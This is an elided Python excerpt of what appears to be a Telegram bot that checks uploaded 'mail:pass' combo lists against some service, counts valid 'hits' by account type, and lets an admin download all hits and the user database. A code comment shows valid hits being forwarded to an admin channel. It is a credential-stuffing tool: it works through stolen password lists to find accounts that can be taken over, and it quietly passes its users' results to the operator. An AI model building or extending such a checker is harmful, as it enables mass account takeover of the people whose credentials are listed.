...
CONFIG = {
    ...
    "TELEGRAM_CHANNEL_ID": os.getenv("TELEGRAM_CHANNEL_ID"),  # Required
    "ADMIN_USER_ID": int(os.getenv("ADMIN_USER_ID", 0)),  # Required, default to 0 if not set
...
def user_stat_inc(user_id, key, incr=1):
    ud = user_data["users"].setdefault(str(user_id), {
        ...
        "total_valid": 0,
        "total_files": 0,
        "account_types": {},  # e.g., {"Free": 0, "Pro Lite": 0, ...}
    ...
    ud["last_used"] = int(time.time())  # Update last_used on any stat increment
    save_user_data()
...
def user_stat_set(user_id, key, val):
    ...
    ud[key] = val
    ud["last_used"] = int(time.time())  # Update last_used on any stat set
    save_user_data()
...
def process_user_file(user_id, file_path, context):
    ...
    user_stat_inc(user_id, "total_files")  # Increment total_files
    hit_lines = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["MAX_THREADS"]) as executor:
        ...
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            ...
            if result["valid"]:
                ...
                # Send hit to admin channel/group
    ...
    with processing_lock:
        for item in list(processing_queue.queue):
            if item[0] == user_id:
                ...
                break
    if in_queue:
        update.message.reply_text(f"⏳ Your file is in the queue!\nQueue Position: {queue_size}")
    else:
        update.message.reply_text("🛌 Nothing in progress for you. Upload a file to start checking!")

def handle_document(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    doc = update.message.document
    if not doc.file_name.lower().endswith(".txt"):
        update.message.reply_text("Please upload a .txt file (mail:pass per line).")
        return
    if doc.file_size > CONFIG["FILE_CAP"]:
        update.message.reply_text("❌ File is too big! Max 5 MB per upload.")
        return
    ...
    if not valid_lines:
        update.message.reply_text("No valid mail:pass lines found.")
        os.remove(file_path)
        return
...
def admin_button(update: Update, context: CallbackContext):
    ...
    if not check_admin(user_id):
        query.message.reply_text("Admin only.")
        return
    if data == 'admin_stats':
        # Most active users, most common domains, etc
        ...
        with open(db_path, "rb") as f:
            context.bot.send_document(chat_id=user_id, document=f, caption="User DB")
        ...
        if hits:
            ...
            with open(hit_path, "rb") as f:
                context.bot.send_document(chat_id=user_id, document=f, caption="All hits")
            os.remove(hit_path)
        else:
            query.message.reply_text("No hits yet.")
        ...
        query.message.reply_text("Reply to this message with your broadcast text.")
...
def hourly_backup(context: CallbackContext):
    while True:
        try:
            ...
            os.remove(report_path)  # Clean up the report file
        except Exception as e:
...
def main():
    ...
    dp.add_handler(MessageHandler(filters.text & filters.reply, admin_broadcast_reply))
    # Start hourly backup thread
    threading.Thread(target=hourly_backup, args=(dp.bot,), daemon=True).start()
